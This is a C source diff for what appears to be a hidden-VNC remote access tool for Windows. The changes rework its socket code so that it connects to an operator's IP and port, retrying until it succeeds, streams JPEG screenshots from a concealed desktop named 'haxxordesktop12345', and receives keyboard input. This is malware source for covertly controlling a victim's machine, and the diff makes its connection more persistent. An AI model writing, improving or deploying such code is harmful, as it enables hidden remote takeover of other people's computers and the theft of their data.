@@ -7,7 +7,7 @@
 #include <shlwapi.h>
 #include <time.h>
 #include "../utils/jpeg.h"
-#include "socks.h"
+#include "../utils/sockslib.h"
 #define DESKTOP_NAME "haxxordesktop12345"
 //for tcc purposes, these apis seem to be lacked
 typedef int WINAPI(*d_RealGetWindowClassA)(HWND a, LPSTR b, UINT c);
@@ -67,11 +67,12 @@ static double factor;
 static HDESK dsk;
 static int sendframeh = 0;
 static int fullfh = 0;
+static SOCKET hvnc_sock;
 static void inputthdh(char* desktop_name){
     SetThreadDesktop(dsk);
     HANDLE hwd = GetTopWindow(NULL);
     while(1){
-        char* data = hvnc_sock_recv();
+        char* data = vnc_sock_recv(hvnc_sock);
         if(data==NULL) return;
         if(data[0]==0x69){ //keypress
             int keycode = 0;
@@ -228,7 +229,7 @@ int hvnc(NETWORK* net){
     else factor = dy;
     srand(time(NULL));
     char desktop_name[1000];
-    sprintf(desktop_name, "%s%d", DESKTOP_NAME, rand());
+    sprintf(desktop_name, "%s", DESKTOP_NAME);//, rand());
     dsk = OpenDesktopA(desktop_name, 0, FALSE, GENERIC_ALL);
     if(dsk==NULL){
         dsk = CreateDesktopA(desktop_name, NULL, NULL, 0, GENERIC_ALL, NULL);
@@ -236,7 +237,7 @@ int hvnc(NETWORK* net){
     }
     SetThreadDesktop(dsk);
     Sleep(1000);
-    hvnc_sock_init(net->ip, net->port);
+    while(newsock(net->ip, net->port, &hvnc_sock) == -1) Sleep(1000);
     HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)inputthdh, desktop_name, 0, NULL);
     HWND hDesk = GetDesktopWindow();
     RECT rect;
@@ -327,7 +328,7 @@ int hvnc(NETWORK* net){
         char* jpg = bmptojpg(hBmp, &sz);
         DeleteObject(hBmp);
         DeleteDC(hNew);
-        if(hvnc_sock_send(jpg, sz, left, top)) break;
+        if(hvnc_sock_send(jpg, sz, left, top, hvnc_sock)) break;
     }
     free(bitmap);
     free(net->ip);
